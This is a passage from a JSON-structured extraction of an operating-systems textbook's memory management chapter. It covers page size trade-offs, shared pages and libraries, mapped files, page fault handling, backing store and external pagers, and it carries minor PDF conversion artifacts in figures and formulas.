            "content": "3.5.3 Page Size\r\nThe page size is a parameter that can be chosen by the operating system. Even\r\nif the hardware has been designed with, for example, 4096-byte pages, the operat\u0002ing system can easily regard page pairs 0 and 1, 2 and 3, 4 and 5, and so on, as\r\n8-KB pages by always allocating two consecutive 8192-byte page frames for them.\n226 MEMORY MANAGEMENT CHAP. 3\r\nDetermining the best page size requires balancing several competing factors.\r\nAs a result, there is no overall optimum. To start with, two factors argue for a\r\nsmall page size. A randomly chosen text, data, or stack segment will not fill an\r\nintegral number of pages. On the average, half of the final page will be empty.\r\nThe extra space in that page is wasted. This wastage is called internal fragmenta\u0002tion. With n segments in memory and a page size of p bytes, np/2 bytes will be\r\nwasted on internal fragmentation. This reasoning argues for a small page size.\r\nAnother argument for a small page size becomes apparent if we think about a\r\nprogram consisting of eight sequential phases of 4 KB each. With a 32-KB page\r\nsize, the program must be allocated 32 KB all the time. With a 16-KB page size, it\r\nneeds only 16 KB. With a page size of 4 KB or smaller, it requires only 4 KB at\r\nany instant. In general, a large page size will cause more wasted space to be in\r\nmemory than a small page size.\r\nOn the other hand, small pages mean that programs will need many pages, and\r\nthus a large page table. A 32-KB program needs only four 8-KB pages, but 64\r\n512-byte pages. Transfers to and from the disk are generally a page at a time, with\r\nmost of the time being for the seek and rotational delay, so that transferring a small\r\npage takes almost as much time as transferring a large page. It might take 64 × 10\r\nmsec to load 64 512-byte pages, but only 4 × 12 msec to load four 8-KB pages.\r\nAlso, small pages use up much valuable space in the TLB. Say your program\r\nuses 1 MB of memory with a working set of 64 KB. With 4-KB pages, the pro\u0002gram would occupy at least 16 entries in the TLB. With 2-MB pages, a single TLB\r\nentry would be sufficient (in theory, it may be that you want to separate data and\r\ninstructions). As TLB entries are scarce, and critical for performance, it pays to use\r\nlarge pages wherever possible. To balance all these trade-offs, operating systems\r\nsometimes use different page sizes for different parts of the system. For instance,\r\nlarge pages for the kernel and smaller ones for user processes.\r\nOn some machines, the page table must be loaded (by the operating system)\r\ninto hardware registers every time the CPU switches from one process to another.\r\nOn these machines, having a small page size means that the time required to load\r\nthe page registers gets longer as the page size gets smaller. Furthermore, the space\r\noccupied by the page table increases as the page size decreases.\r\nThis last point can be analyzed mathematically. Let the average process size be\r\ns bytes and the page size be p bytes. Furthermore, assume that each page entry re\u0002quires e bytes. The approximate number of pages needed per process is then s/ p,\r\noccupying se / p bytes of page table space. The wasted memory in the last page of\r\nthe process due to internal fragmentation is p/2. Thus, the total overhead due to\r\nthe page table and the internal fragmentation loss is given by the sum of these two\r\nterms:\r\noverhead = se /p + p/2\r\nThe first term (page table size) is large when the page size is small. The second\r\nterm (internal fragmentation) is large when the page size is large. The optimum\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 227\r\nmust lie somewhere in between. By taking the first derivative with respect to p and\r\nequating it to zero, we get the equation\r\n−se /p2 + 1/2 = 0\r\nFrom this equation we can derive a formula that gives the optimum page size (con\u0002sidering only memory wasted in fragmentation and page table size). The result is:\r\np = ⎯⎯ √⎯2se\r\nFor s = 1MB and e = 8 bytes per page table entry, the optimum page size is 4 KB.\r\nCommercially available computers have used page sizes ranging from 512 bytes to\r\n64 KB. A typical value used to be 1 KB, but nowadays 4 KB is more common."
          },
          "3.5.4 Separate Instruction and Data Spaces": {
            "page": 258,
            "content": "3.5.4 Separate Instruction and Data Spaces\r\nMost computers have a single address space that holds both programs and data,\r\nas shown in Fig. 3-24(a). If this address space is large enough, everything works\r\nfine. However, if it’s too small, it forces programmers to stand on their heads to fit\r\nev erything into the address space.\r\n \r\nSingle address\r\nspace\r\n232\r\n0\r\nData\r\nProgram\r\n(a)\r\nI space D space\r\n232\r\n0\r\nProgram\r\nUnused page\r\nData\r\n(b)\r\nFigure 3-24. (a) One address space. (b) Separate I and D spaces.\r\nOne solution, pioneered on the (16-bit) PDP-11, is to have separate address\r\nspaces for instructions (program text) and data, called I-space and D-space, re\u0002spectively, as illustrated in Fig. 3-24(b). Each address space runs from 0 to some\r\nmaximum, typically 216 − 1 or 232 − 1. The linker must know when separate I\u0002and D-spaces are being used, because when they are, the data are relocated to vir\u0002tual address 0 instead of starting after the program.\r\nIn a computer with this kind of design, both address spaces can be paged, inde\u0002pendently from one another. Each one has its own page table, with its own map\u0002ping of virtual pages to physical page frames. When the hardware wants to fetch an\r\ninstruction, it knows that it must use I-space and the I-space page table. Similarly,\r\ndata must go through the D-space page table. Other than this distinction, having\r\nseparate I- and D-spaces does not introduce any special complications for the oper\u0002ating system and it does double the available address space.\n228 MEMORY MANAGEMENT CHAP. 3\r\nWhile address spaces these days are large, their sizes used to be a serious prob\u0002lem. Even today, though, separate I- and D-spaces are still common. However,\r\nrather than for the normal address spaces, they are now used to divide the L1\r\ncache. After all, in the L1 cache, memory is still plenty scarce."
          },
          "3.5.5 Shared Pages": {
            "page": 259,
            "content": "3.5.5 Shared Pages\r\nAnother design issue is sharing. In a large multiprogramming system, it is\r\ncommon for several users to be running the same program at the same time. Even a\r\nsingle user may be running several programs that use the same library. It is clearly\r\nmore efficient to share the pages, to avoid having two copies of the same page in\r\nmemory at the same time. One problem is that not all pages are sharable. In partic\u0002ular, pages that are read-only, such as program text, can be shared, but for data\r\npages sharing is more complicated.\r\nIf separate I- and D-spaces are supported, it is relatively straightforward to\r\nshare programs by having two or more processes use the same page table for their\r\nI-space but different page tables for their D-spaces. Typically in an implementation\r\nthat supports sharing in this way, page tables are data structures independent of the\r\nprocess table. Each process then has two pointers in its process table: one to the I\u0002space page table and one to the D-space page table, as shown in Fig. 3-25. When\r\nthe scheduler chooses a process to run, it uses these pointers to locate the ap\u0002propriate page tables and sets up the MMU using them. Even without separate I\u0002and D-spaces, processes can share programs (or sometimes, libraries), but the\r\nmechanism is more complicated.\r\nWhen two or more processes share some code, a problem occurs with the shar\u0002ed pages. Suppose that processes A and B are both running the editor and sharing\r\nits pages. If the scheduler decides to remove A from memory, evicting all its pages\r\nand filling the empty page frames with some other program will cause B to gener\u0002ate a large number of page faults to bring them back in again.\r\nSimilarly, when A terminates, it is essential to be able to discover that the\r\npages are still in use so that their disk space will not be freed by accident. Search\u0002ing all the page tables to see if a page is shared is usually too expensive, so special\r\ndata structures are needed to keep track of shared pages, especially if the unit of\r\nsharing is the individual page (or run of pages), rather than an entire page table.\r\nSharing data is trickier than sharing code, but it is not impossible. In particu\u0002lar, in UNIX, after a fork system call, the parent and child are required to share\r\nboth program text and data. In a paged system, what is often done is to give each\r\nof these processes its own page table and have both of them point to the same set\r\nof pages. Thus no copying of pages is done at fork time. However, all the data\r\npages are mapped into both processes as READ ONLY.\r\nAs long as both processes just read their data, without modifying it, this situa\u0002tion can continue. As soon as either process updates a memory word, the violation\r\nof the read-only protection causes a trap to the operating system. A copy is then\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 229\r\nProgram\r\nProcess\r\ntable\r\nData 1 Data 2\r\nPage tables\r\nFigure 3-25. Tw o processes sharing the same program sharing its page tables.\r\nmade of the offending page so that each process now has its own private copy.\r\nBoth copies are now set to READ/WRITE, so subsequent writes to either copy\r\nproceed without trapping. This strategy means that those pages that are never mod\u0002ified (including all the program pages) need not be copied. Only the data pages that\r\nare actually modified need to be copied. This approach, called copy on write, im\u0002proves performance by reducing copying."
          },
          "3.5.6 Shared Libraries": {
            "page": 260,
            "content": "3.5.6 Shared Libraries\r\nSharing can be done at other granularities than individual pages. If a program\r\nis started up twice, most operating systems will automatically share all the text\r\npages so that only one copy is in memory. Text pages are always read only, so there\r\nis no problem here. Depending on the operating system, each process may get its\r\nown private copy of the data pages, or they may be shared and marked read only.\r\nIf any process modifies a data page, a private copy will be made for it, that is, copy\r\non write will be applied.\r\nIn modern systems, there are many large libraries used by many processes, for\r\nexample, multiple I/O and graphics libraries. Statically binding all these libraries to\r\nev ery executable program on the disk would make them even more bloated than\r\nthey already are.\r\nInstead, a common technique is to use shared libraries (which are called\r\nDLLs or Dynamic Link Libraries on Windows). To make the idea of a shared\n230 MEMORY MANAGEMENT CHAP. 3\r\nlibrary clear, first consider traditional linking. When a program is linked, one or\r\nmore object files and possibly some libraries are named in the command to the\r\nlinker, such as the UNIX command\r\nld *.o –lc –lm\r\nwhich links all the .o (object) files in the current directory and then scans two li\u0002braries, /usr/lib/libc.a and /usr/lib/libm.a. Any functions called in the object files\r\nbut not present there (e.g., printf) are called undefined externals and are sought in\r\nthe libraries. If they are found, they are included in the executable binary. Any\r\nfunctions that they call but are not yet present also become undefined externals.\r\nFor example, printf needs write, so if write is not already included, the linker will\r\nlook for it and include it when found. When the linker is done, an executable bina\u0002ry file is written to the disk containing all the functions needed. Functions present\r\nin the libraries but not called are not included. When the program is loaded into\r\nmemory and executed, all the functions it needs are there.\r\nNow suppose common programs use 20–50 MB worth of graphics and user in\u0002terface functions. Statically linking hundreds of programs with all these libraries\r\nwould waste a tremendous amount of space on the disk as well as wasting space in\r\nRAM when they were loaded since the system would have no way of knowing it\r\ncould share them. This is where shared libraries come in. When a program is link\u0002ed with shared libraries (which are slightly different than static ones), instead of in\u0002cluding the actual function called, the linker includes a small stub routine that\r\nbinds to the called function at run time. Depending on the system and the configu\u0002ration details, shared libraries are loaded either when the program is loaded or\r\nwhen functions in them are called for the first time. Of course, if another program\r\nhas already loaded the shared library, there is no need to load it again—that is the\r\nwhole point of it. Note that when a shared library is loaded or used, the entire li\u0002brary is not read into memory in a single blow. It is paged in, page by page, as\r\nneeded, so functions that are not called will not be brought into RAM.\r\nIn addition to making executable files smaller and also saving space in memo\u0002ry, shared libraries have another important advantage: if a function in a shared li\u0002brary is updated to remove a bug, it is not necessary to recompile the programs that\r\ncall it. The old binaries continue to work. This feature is especially important for\r\ncommercial software, where the source code is not distributed to the customer. For\r\nexample, if Microsoft finds and fixes a security error in some standard DLL, Win\u0002dows Update will download the new DLL and replace the old one, and all pro\u0002grams that use the DLL will automatically use the new version the next time they\r\nare launched.\r\nShared libraries come with one little problem, however, that has to be solved,\r\nhowever. The problem is illustrated in Fig. 3-26. Here we see two processes shar\u0002ing a library of size 20 KB (assuming each box is 4 KB). However, the library is\r\nlocated at a different address in each process, presumably because the programs\r\nthemselves are not the same size. In process 1, the library starts at address 36K; in\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 231\r\nprocess 2 it starts at 12K. Suppose that the first thing the first function in the li\u0002brary has to do is jump to address 16 in the library. If the library were not shared,\r\nit could be relocated on the fly as it was loaded so that the jump (in process 1)\r\ncould be to virtual address 36K + 16. Note that the physical address in the RAM\r\nwhere the library is located does not matter since all the pages are mapped from\r\nvirtual to physical addresses by the MMU hardware.\r\nProcess 1 Process 2 RAM\r\n36K\r\n12K\r\n0 0\r\nFigure 3-26. A shared library being used by two processes.\r\nHowever, since the library is shared, relocation on the fly will not work. After\r\nall, when the first function is called by process 2 (at address 12K), the jump in\u0002struction has to go to 12K + 16, not 36K + 16. This is the little problem. One way\r\nto solve it is to use copy on write and create new pages for each process sharing the\r\nlibrary, relocating them on the fly as they are created, but this scheme defeats the\r\npurpose of sharing the library, of course.\r\nA better solution is to compile shared libraries with a special compiler flag tel\u0002ling the compiler not to produce any instructions that use absolute addresses. In\u0002stead only instructions using relative addresses are used. For example, there is al\u0002most always an instruction that says jump forward (or backward) by n bytes (as\r\nopposed to an instruction that gives a specific address to jump to). This instruction\r\nworks correctly no matter where the shared library is placed in the virtual address\r\nspace. By avoiding absolute addresses, the problem can be solved. Code that uses\r\nonly relative offsets is called position-independent code."
          },
          "3.5.7 Mapped Files": {
            "page": 262,
            "content": "3.5.7 Mapped Files\r\nShared libraries are really a special case of a more general facility called mem\u0002ory-mapped files. The idea here is that a process can issue a system call to map a\r\nfile onto a portion of its virtual address space. In most implementations, no pages\r\nare brought in at the time of the mapping, but as pages are touched, they are de\u0002mand paged in one page at a time, using the disk file as the backing store. When\n232 MEMORY MANAGEMENT CHAP. 3\r\nthe process exits, or explicitly unmaps the file, all the modified pages are written\r\nback to the file on disk.\r\nMapped files provide an alternative model for I/O. Instead, of doing reads and\r\nwrites, the file can be accessed as a big character array in memory. In some situa\u0002tions, programmers find this model more convenient.\r\nIf two or more processes map onto the same file at the same time, they can\r\ncommunicate over shared memory. Writes done by one process to the shared mem\u0002ory are immediately visible when the other one reads from the part of its virtual ad\u0002dress spaced mapped onto the file. This mechanism thus provides a high-band\u0002width channel between processes and is often used as such (even to the extent of\r\nmapping a scratch file). Now it should be clear that if memory-mapped files are\r\navailable, shared libraries can use this mechanism."
          },
          "3.5.8 Cleaning Policy": {
            "page": 263,
            "content": "3.5.8 Cleaning Policy\r\nPaging works best when there is an abundant supply of free page frames that\r\ncan be claimed as page faults occur. If every page frame is full, and furthermore\r\nmodified, before a new page can be brought in, an old page must first be written to\r\ndisk. To ensure a plentiful supply of free page frames, paging systems generally\r\nhave a background process, called the paging daemon, that sleeps most of the time\r\nbut is awakened periodically to inspect the state of memory. If too few page\r\nframes are free, it begins selecting pages to evict using some page replacement al\u0002gorithm. If these pages have been modified since being loaded, they are written to\r\ndisk.\r\nIn any event, the previous contents of the page are remembered. In the event\r\none of the evicted pages is needed again before its frame has been overwritten, it\r\ncan be reclaimed by removing it from the pool of free page frames. Keeping a sup\u0002ply of page frames around yields better performance than using all of memory and\r\nthen trying to find a frame at the moment it is needed. At the very least, the paging\r\ndaemon ensures that all the free frames are clean, so they need not be written to\r\ndisk in a big hurry when they are required.\r\nOne way to implement this cleaning policy is with a two-handed clock. The\r\nfront hand is controlled by the paging daemon. When it points to a dirty page, that\r\npage is written back to disk and the front hand is advanced. When it points to a\r\nclean page, it is just advanced. The back hand is used for page replacement, as in\r\nthe standard clock algorithm. Only now, the probability of the back hand hitting a\r\nclean page is increased due to the work of the paging daemon."
          },
          "3.5.9 Virtual Memory Interface": {
            "page": 263,
            "content": "3.5.9 Virtual Memory Interface\r\nUp until now, our whole discussion has assumed that virtual memory is\r\ntransparent to processes and programmers, that is, all they see is a large virtual ad\u0002dress space on a computer with a small(er) physical memory. With many systems,\nSEC. 3.5 DESIGN ISSUES FOR PAGING SYSTEMS 233\r\nthat is true, but in some advanced systems, programmers have some control over\r\nthe memory map and can use it in nontraditional ways to enhance program behav\u0002ior. In this section, we will briefly look at a few of these.\r\nOne reason for giving programmers control over their memory map is to allow\r\ntwo or more processes to share the same memory. sometimes in sophisticated\r\nways. If programmers can name regions of their memory, it may be possible for\r\none process to give another process the name of a memory region so that process\r\ncan also map it in. With two (or more) processes sharing the same pages, high\r\nbandwidth sharing becomes possible—one process writes into the shared memory\r\nand another one reads from it. A sophisticated example of such a communication\r\nchannel is described by De Bruijn (2011).\r\nSharing of pages can also be used to implement a high-performance mes\u0002sage-passing system. Normally, when messages are passed, the data are copied\r\nfrom one address space to another, at considerable cost. If processes can control\r\ntheir page map, a message can be passed by having the sending process unmap the\r\npage(s) containing the message, and the receiving process mapping them in. Here\r\nonly the page names have to be copied, instead of all the data.\r\nYet another advanced memory management technique is distributed shared\r\nmemory (Feeley et al., 1995; Li, 1986; Li and Hudak, 1989; and Zekauskas et al.,\r\n1994). The idea here is to allow multiple processes over a network to share a set of\r\npages, possibly, but not necessarily, as a single shared linear address space. When a\r\nprocess references a page that is not currently mapped in, it gets a page fault. The\r\npage fault handler, which may be in the kernel or in user space, then locates the\r\nmachine holding the page and sends it a message asking it to unmap the page and\r\nsend it over the network. When the page arrives, it is mapped in and the faulting in\u0002struction is restarted. We will examine distributed shared memory in Chap. 8."
          }
        }
      },
      "3.6 IMPLEMENTATION ISSUES": {
        "page": 264,
        "children": {
          "3.6.1 Operating System Involvement with Paging": {
            "page": 264,
            "content": "3.6.1 Operating System Involvement with Paging\r\nThere are four times when the operating system has paging-related work to do:\r\nprocess creation time, process execution time, page fault time, and process termi\u0002nation time. We will now briefly examine each of these to see what has to be done.\r\nWhen a new process is created in a paging system, the operating system has to\r\ndetermine how large the program and data will be (initially) and create a page table\n234 MEMORY MANAGEMENT CHAP. 3\r\nfor them. Space has to be allocated in memory for the page table and it has to be\r\ninitialized. The page table need not be resident when the process is swapped out\r\nbut has to be in memory when the process is running. In addition, space has to be\r\nallocated in the swap area on disk so that when a page is swapped out, it has some\u0002where to go. The swap area also has to be initialized with program text and data so\r\nthat when the new process starts getting page faults, the pages can be brought in.\r\nSome systems page the program text directly from the executable file, thus saving\r\ndisk space and initialization time. Finally, information about the page table and\r\nswap area on disk must be recorded in the process table.\r\nWhen a process is scheduled for execution, the MMU has to be reset for the\r\nnew process and the TLB flushed, to get rid of traces of the previously executing\r\nprocess. The new process’ page table has to be made current, usually by copying it\r\nor a pointer to it to some hardware register(s). Optionally, some or all of the proc\u0002ess’ pages can be brought into memory to reduce the number of page faults ini\u0002tially (e.g., it is certain that the page pointed to by the program counter will be\r\nneeded).\r\nWhen a page fault occurs, the operating system has to read out hardware regis\u0002ters to determine which virtual address caused the fault. From this information, it\r\nmust compute which page is needed and locate that page on disk. It must then find\r\nan available page frame in which to put the new page, evicting some old page if\r\nneed be. Then it must read the needed page into the page frame. Finally, it must\r\nback up the program counter to have it point to the faulting instruction and let that\r\ninstruction execute again.\r\nWhen a process exits, the operating system must release its page table, its\r\npages, and the disk space that the pages occupy when they are on disk. If some of\r\nthe pages are shared with other processes, the pages in memory and on disk can be\r\nreleased only when the last process using them has terminated."
          },
          "3.6.2 Page Fault Handling": {
            "page": 265,
            "content": "3.6.2 Page Fault Handling\r\nWe are finally in a position to describe in detail what happens on a page fault.\r\nThe sequence of events is as follows:\r\n1. The hardware traps to the kernel, saving the program counter on the\r\nstack. On most machines, some information about the state of the\r\ncurrent instruction is saved in special CPU registers.\r\n2. An assembly-code routine is started to save the general registers and\r\nother volatile information, to keep the operating system from destroy\u0002ing it. This routine calls the operating system as a procedure.\r\n3. The operating system discovers that a page fault has occurred, and\r\ntries to discover which virtual page is needed. Often one of the hard\u0002ware registers contains this information. If not, the operating system\nSEC. 3.6 IMPLEMENTATION ISSUES 235\r\nmust retrieve the program counter, fetch the instruction, and parse it\r\nin software to figure out what it was doing when the fault hit.\r\n4. Once the virtual address that caused the fault is known, the system\r\nchecks to see if this address is valid and the protection is consistent\r\nwith the access. If not, the process is sent a signal or killed. If the ad\u0002dress is valid and no protection fault has occurred, the system checks\r\nto see if a page frame is free. If no frames are free, the page re\u0002placement algorithm is run to select a victim.\r\n5. If the page frame selected is dirty, the page is scheduled for transfer to\r\nthe disk, and a context switch takes place, suspending the faulting\r\nprocess and letting another one run until the disk transfer has com\u0002pleted. In any event, the frame is marked as busy to prevent it from\r\nbeing used for another purpose.\r\n6. As soon as the page frame is clean (either immediately or after it is\r\nwritten to disk), the operating system looks up the disk address where\r\nthe needed page is, and schedules a disk operation to bring it in.\r\nWhile the page is being loaded, the faulting process is still suspended\r\nand another user process is run, if one is available.\r\n7. When the disk interrupt indicates that the page has arrived, the page\r\ntables are updated to reflect its position, and the frame is marked as\r\nbeing in the normal state.\r\n8. The faulting instruction is backed up to the state it had when it began\r\nand the program counter is reset to point to that instruction.\r\n9. The faulting process is scheduled, and the operating system returns to\r\nthe (assembly-language) routine that called it.\r\n10. This routine reloads the registers and other state information and re\u0002turns to user space to continue execution, as if no fault had occurred."
          },
          "3.6.3 Instruction Backup": {
            "page": 266,
            "content": "3.6.3 Instruction Backup\r\nWhen a program references a page that is not in memory, the instruction caus\u0002ing the fault is stopped partway through and a trap to the operating system occurs.\r\nAfter the operating system has fetched the page needed, it must restart the instruc\u0002tion causing the trap. This is easier said than done.\r\nTo see the nature of this problem at its worst, consider a CPU that has instruc\u0002tions with two addresses, such as the Motorola 680x0, widely used in embedded\r\nsystems. The instruction\r\nMOV.L #6(A1),2(A0)\n236 MEMORY MANAGEMENT CHAP. 3\r\nis 6 bytes, for example (see Fig. 3-27). In order to restart the instruction, the oper\u0002ating system must determine where the first byte of the instruction is. The value of\r\nthe program counter at the time of the trap depends on which operand faulted and\r\nhow the CPU’s microcode has been implemented.\r\nMOVE\r\n6\r\n2\r\n1000\r\n1002\r\n1004\r\nOpcode\r\nFirst operand\r\nSecond operand\r\n16 Bits\r\nMOVE.L #6(A1), 2(A0)\r\n}\r\n}\r\n}\r\nFigure 3-27. An instruction causing a page fault.\r\nIn Fig. 3-27, we have an instruction starting at address 1000 that makes three\r\nmemory references: the instruction word and two offsets for the operands. Depend\u0002ing on which of these three memory references caused the page fault, the program\r\ncounter might be 1000, 1002, or 1004 at the time of the fault. It is frequently im\u0002possible for the operating system to determine unambiguously where the instruc\u0002tion began. If the program counter is 1002 at the time of the fault, the operating\r\nsystem has no way of telling whether the word in 1002 is a memory address asso\u0002ciated with an instruction at 1000 (e.g., the address of an operand) or an opcode.\r\nBad as this problem may be, it could have been worse. Some 680x0 addressing\r\nmodes use autoincrementing, which means that a side effect of executing the in\u0002struction is to increment one (or more) registers. Instructions that use autoincre\u0002ment mode can also fault. Depending on the details of the microcode, the incre\u0002ment may be done before the memory reference, in which case the operating sys\u0002tem must decrement the register in software before restarting the instruction. Or,\r\nthe autoincrement may be done after the memory reference, in which case it will\r\nnot have been done at the time of the trap and must not be undone by the operating\r\nsystem. Autodecrement mode also exists and causes a similar problem. The pre\u0002cise details of whether autoincrements and autodecrements have or hav e not been\r\ndone before the corresponding memory references may differ from instruction to\r\ninstruction and from CPU model to CPU model.\r\nFortunately, on some machines the CPU designers provide a solution, usually\r\nin the form of a hidden internal register into which the program counter is copied\r\njust before each instruction is executed. These machines may also have a second\r\nregister telling which registers have already been autoincremented or autodecre\u0002mented, and by how much. Given this information, the operating system can unam\u0002biguously undo all the effects of the faulting instruction so that it can be restarted.\r\nIf this information is not available, the operating system has to jump through hoops\r\nto figure out what happened and how to repair it. It is as though the hardware de\u0002signers were unable to solve the problem, so they threw up their hands and told the\r\noperating system writers to deal with it. Nice guys.\nSEC. 3.6 IMPLEMENTATION ISSUES 237"
          },
          "3.6.4 Locking Pages in Memory": {
            "page": 268,
            "content": "3.6.4 Locking Pages in Memory\r\nAlthough we have not discussed I/O much in this chapter, the fact that a com\u0002puter has virtual memory does not mean that I/O is absent. Virtual memory and I/O\r\ninteract in subtle ways. Consider a process that has just issued a system call to\r\nread from some file or device into a buffer within its address space. While waiting\r\nfor the I/O to complete, the process is suspended and another process is allowed to\r\nrun. This other process gets a page fault.\r\nIf the paging algorithm is global, there is a small, but nonzero, chance that the\r\npage containing the I/O buffer will be chosen to be removed from memory. If an\r\nI/O device is currently in the process of doing a DMA transfer to that page, remov\u0002ing it will cause part of the data to be written in the buffer where they belong, and\r\npart of the data to be written over the just-loaded page. One solution to this prob\u0002lem is to lock pages engaged in I/O in memory so that they will not be removed.\r\nLocking a page is often called pinning it in memory. Another solution is to do all\r\nI/O to kernel buffers and then copy the data to user pages later."
          },
          "3.6.5 Backing Store": {
            "page": 268,
            "content": "3.6.5 Backing Store\r\nIn our discussion of page replacement algorithms, we saw how a page is selec\u0002ted for removal. We hav e not said much about where on the disk it is put when it is\r\npaged out. Let us now describe some of the issues related to disk management.\r\nThe simplest algorithm for allocating page space on the disk is to have a spe\u0002cial swap partition on the disk or, even better, on a separate disk from the file sys\u0002tem (to balance the I/O load). Most UNIX systems work like this. This partition\r\ndoes not have a normal file system on it, which eliminates all the overhead of con\u0002verting offsets in files to block addresses. Instead, block numbers relative to the\r\nstart of the partition are used throughout.\r\nWhen the system is booted, this swap partition is empty and is represented in\r\nmemory as a single entry giving its origin and size. In the simplest scheme, when\r\nthe first process is started, a chunk of the partition area the size of the first process\r\nis reserved and the remaining area reduced by that amount. As new processes are\r\nstarted, they are assigned chunks of the swap partition equal in size to their core\r\nimages. As they finish, their disk space is freed. The swap partition is managed as\r\na list of free chunks. Better algorithms will be discussed in Chap. 10.\r\nAssociated with each process is the disk address of its swap area, that is, where\r\non the swap partition its image is kept. This information is kept in the process ta\u0002ble. Calculating the address to write a page to becomes simple: just add the offset\r\nof the page within the virtual address space to the start of the swap area. However,\r\nbefore a process can start, the swap area must be initialized. One way is to copy\r\nthe entire process image to the swap area, so that it can be brought in as needed.\r\nThe other is to load the entire process in memory and let it be paged out as needed.\n238 MEMORY MANAGEMENT CHAP. 3\r\nHowever, this simple model has a problem: processes can increase in size after\r\nstarting. Although the program text is usually fixed, the data area can sometimes\r\ngrow, and the stack can always grow. Consequently, it may be better to reserve sep\u0002arate swap areas for the text, data, and stack and allow each of these areas to con\u0002sist of more than one chunk on the disk.\r\nThe other extreme is to allocate nothing in advance and allocate disk space for\r\neach page when it is swapped out and deallocate it when it is swapped back in. In\r\nthis way, processes in memory do not tie up any swap space. The disadvantage is\r\nthat a disk address is needed in memory to keep track of each page on disk. In\r\nother words, there must be a table per process telling for each page on disk where\r\nit is. The two alternatives are shown in Fig. 3-28.\r\n0\r\n4\r\n3\r\n6\r\n6\r\n4\r\n3\r\n0\r\n7\r\n5\r\n2\r\n1\r\nPages\r\nPage\r\ntable\r\nMain memory Disk\r\nSwap area\r\n(a)\r\n0\r\n4\r\n3\r\n6\r\n6\r\n4\r\n3\r\n0\r\n5\r\n1\r\n7\r\n2\r\nPages\r\nPage\r\ntable\r\nMain memory Disk\r\nSwap area\r\n(b)\r\nDisk\r\nmap\r\nFigure 3-28. (a) Paging to a static swap area. (b) Backing up pages dynamically.\r\nIn Fig. 3-28(a), a page table with eight pages is shown. Pages 0, 3, 4, and 6 are\r\nin main memory. Pages 1, 2, 5, and 7 are on disk. The swap area on disk is as large\r\nas the process virtual address space (eight pages), with each page having a fixed lo\u0002cation to which it is written when it is evicted from main memory. Calculating this\r\naddress requires knowing only where the process’ paging area begins, since pages\r\nare stored in it contiguously in order of their virtual page number. A page that is in\r\nmemory always has a shadow copy on disk, but this copy may be out of date if the\r\npage has been modified since being loaded. The shaded pages in memory indicate\r\npages not present in memory. The shaded pages on the disk are (in principle)\r\nsuperseded by the copies in memory, although if a memory page has to be swapped\r\nback to disk and it has not been modified since it was loaded, the (shaded) disk\r\ncopy will be used.\r\nIn Fig. 3-28(b), pages do not have fixed addresses on disk. When a page is\r\nswapped out, an empty disk page is chosen on the fly and the disk map (which has\nSEC. 3.6 IMPLEMENTATION ISSUES 239\r\nroom for one disk address per virtual page) is updated accordingly. A page in\r\nmemory has no copy on disk. The pages’ entries in the disk map contain an invalid\r\ndisk address or a bit marking them as not in use.\r\nHaving a fixed swap partition is not always possible. For example, no disk par\u0002titions may be available. In this case, one or more large, preallocated files within\r\nthe normal file system can be used. Windows uses this approach. However, an\r\noptimization can be used here to reduce the amount of disk space needed. Since the\r\nprogram text of every process came from some (executable) file in the file system,\r\nthe executable file can be used as the swap area. Better yet, since the program text\r\nis generally read only, when memory is tight and program pages have to be evicted\r\nfrom memory, they are just discarded and read in again from the executable file\r\nwhen needed. Shared libraries can also work this way."
          },
          "3.6.6 Separation of Policy and Mechanism": {
            "page": 270,
            "content": "3.6.6 Separation of Policy and Mechanism\r\nAn important tool for managing the complexity of any system is to split policy\r\nfrom mechanism. This principle can be applied to memory management by having\r\nmost of the memory manager run as a user-level process. Such a separation was\r\nfirst done in Mach (Young et al., 1987) on which the discussion below is based.\r\nA simple example of how policy and mechanism can be separated is shown in\r\nFig. 3-29. Here the memory management system is divided into three parts:\r\n1. A low-level MMU handler.\r\n2. A page fault handler that is part of the kernel.\r\n3. An external pager running in user space.\r\nAll the details of how the MMU works are encapsulated in the MMU handler,\r\nwhich is machine-dependent code and has to be rewritten for each new platform\r\nthe operating system is ported to. The page-fault handler is machine-independent\r\ncode and contains most of the mechanism for paging. The policy is largely deter\u0002mined by the external pager, which runs as a user process.\r\nWhen a process starts up, the external pager is notified in order to set up the\r\nprocess’ page map and allocate the necessary backing store on the disk if need be.\r\nAs the process runs, it may map new objects into its address space, so the external\r\npager is once again notified.\r\nOnce the process starts running, it may get a page fault. The fault handler fig\u0002ures out which virtual page is needed and sends a message to the external pager,\r\ntelling it the problem. The external pager then reads the needed page in from the\r\ndisk and copies it to a portion of its own address space. Then it tells the fault hand\u0002ler where the page is. The fault handler then unmaps the page from the external\r\npager’s address space and asks the MMU handler to put it into the user’s address\r\nspace at the right place. Then the user process can be restarted.\n240 MEMORY MANAGEMENT CHAP. 3\r\nDisk Main memory\r\nExternal\r\npager\r\nFault\r\nhandler\r\nUser\r\nprocess\r\nMMU\r\nhandler\r\n1. Page\r\n fault\r\n6. Map\r\n page in\r\n 5. Here \r\n is page\r\nUser\r\nspace\r\nKernel\r\nspace\r\n2. Needed\r\npage\r\n4. Page\r\n arrives\r\n3. Request page\r\nFigure 3-29. Page fault handling with an external pager.\r\nThis implementation leaves open where the page replacement algorithm is put.\r\nIt would be cleanest to have it in the external pager, but there are some problems\r\nwith this approach. Principal among these is that the external pager does not have\r\naccess to the R and M bits of all the pages. These bits play a role in many of the\r\npaging algorithms. Thus, either some mechanism is needed to pass this informa\u0002tion up to the external pager, or the page replacement algorithm must go in the ker\u0002nel. In the latter case, the fault handler tells the external pager which page it has\r\nselected for eviction and provides the data, either by mapping it into the external\r\npager’s address space or including it in a message. Either way, the external pager\r\nwrites the data to disk.\r\nThe main advantage of this implementation is more modular code and greater\r\nflexibility. The main disadvantage is the extra overhead of crossing the user-kernel\r\nboundary several times and the overhead of the various messages being sent be\u0002tween the pieces of the system. At the moment, the subject is highly controversial,\r\nbut as computers get faster and faster, and the software gets more and more com\u0002plex, in the long run sacrificing some performance for more reliable software will\r\nprobably be acceptable to most implementers."
          }
        }
      },
      "3.7 SEGMENTATION": {
        "page": 271,
        "children": {
          "3.7.1 Implementation of Pure Segmentation": {
            "page": 274,
